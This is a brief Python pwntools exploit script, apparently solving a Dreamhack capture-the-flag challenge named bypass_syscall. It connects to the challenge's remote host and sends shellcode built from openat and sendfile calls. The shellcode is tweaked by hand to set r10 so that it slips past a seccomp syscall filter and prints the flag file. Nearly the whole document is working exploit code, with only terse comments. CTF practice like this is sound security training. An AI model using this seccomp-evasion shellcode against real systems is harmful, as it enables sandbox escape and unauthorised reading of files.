# Name: bypass_seccomp.py
from pwn import *

context.arch = 'x86_64'
p = remote("host1.dreamhack.games", 16305)
# p = process("./bypass_syscall")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

shellcode = shellcraft.openat(0, "/home/bypass_syscall/flag")
shellcode += 'mov r10, 0xffff' #sendfile, how much you read??
# xor r10 r10.. why you in here?
shellcode += shellcraft.sendfile(1, 'rax', 0).replace("xor r10d, r10d","")
# shellcode += shellcraft.sendfile(1, 'rax', 0)
shellcode += shellcraft.exit(0)

p.sendline(asm(shellcode))
p.interactive()